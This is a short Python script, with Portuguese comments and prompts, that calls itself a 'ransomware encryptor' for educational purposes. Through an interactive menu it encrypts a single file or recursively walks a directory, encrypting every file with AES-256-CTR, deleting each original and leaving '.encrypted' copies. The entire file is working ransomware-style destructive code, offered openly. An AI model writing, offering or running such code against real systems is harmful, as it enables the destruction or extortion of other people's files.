#!/usr/bin/env python3
"""
🔓 RANSOMWARE ENCRYPTOR
Sistema de criptografia de arquivos para fins educacionais
"""

import os
import pyaes
from pathlib import Path

def encrypt_file(file_path, key):
    """Criptografa um arquivo com AES-256-CTR"""
    file_path = Path(file_path)

    if not file_path.exists():
        print(f"[!] Arquivo não encontrado: {file_path}")
        return None

    # Ler arquivo
    with open(file_path, "rb") as f:
        file_data = f.read()

    print(f"[*] Criptografando: {file_path} ({len(file_data)} bytes)")

    # Remover original
    os.remove(file_path)

    # Criptografar com AES-256-CTR
    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)

    # Salvar arquivo criptografado
    encrypted_file = f"{file_path}.encrypted"
    with open(encrypted_file, "wb") as f:
        f.write(crypto_data)

    print(f"[✓] Arquivo criptografado: {encrypted_file}")
    return encrypted_file


def encrypt_directory(dir_path, key):
    """Criptografa todos os arquivos de um diretório"""
    dir_path = Path(dir_path)

    if not dir_path.is_dir():
        print(f"[!] Diretório não encontrado: {dir_path}")
        return

    files = list(dir_path.rglob("*"))
    files = [f for f in files if f.is_file() and not str(f).endswith(".encrypted")]

    if not files:
        print("[!] Nenhum arquivo encontrado")
        return

    print(f"\n[*] Criptografando {len(files)} arquivo(s)...\n")

    count = 0
    for file_path in files:
        try:
            result = encrypt_file(file_path, key)
            if result:
                count += 1
        except Exception as e:
            print(f"[!] Erro ao criptografar {file_path}: {e}")

    print(f"\n[✓] {count} arquivo(s) criptografado(s)!")


def main():
    print("╔" + "═"*48 + "╗")
    print("║" + " "*10 + "🔓 RANSOMWARE ENCRYPTOR 🔓" + " "*10 + "║")
    print("╚" + "═"*48 + "╝")

    while True:
        print("\n[MENU]")
        print("1. Criptografar arquivo")
        print("2. Criptografar diretório")
        print("3. Sair")

        choice = input("\n>>> Escolha uma opção: ").strip()

        if choice == "1":
            file_path = input(">>> Caminho do arquivo: ").strip()
            key = input(">>> Chave de criptografia (32 caracteres): ").encode()

            if len(key) != 32:
                print("[!] Chave deve ter exatamente 32 caracteres (256 bits)!")
                continue

            encrypt_file(file_path, key)

        elif choice == "2":
            dir_path = input(">>> Caminho do diretório: ").strip()
            key = input(">>> Chave de criptografia (32 caracteres): ").encode()

            if len(key) != 32:
                print("[!] Chave deve ter exatamente 32 caracteres (256 bits)!")
                continue

            encrypt_directory(dir_path, key)

        elif choice == "3":
            print("\n[*] Encerrando...")
            break

        else:
            print("[!] Opção inválida!")


if __name__ == "__main__":
    main()
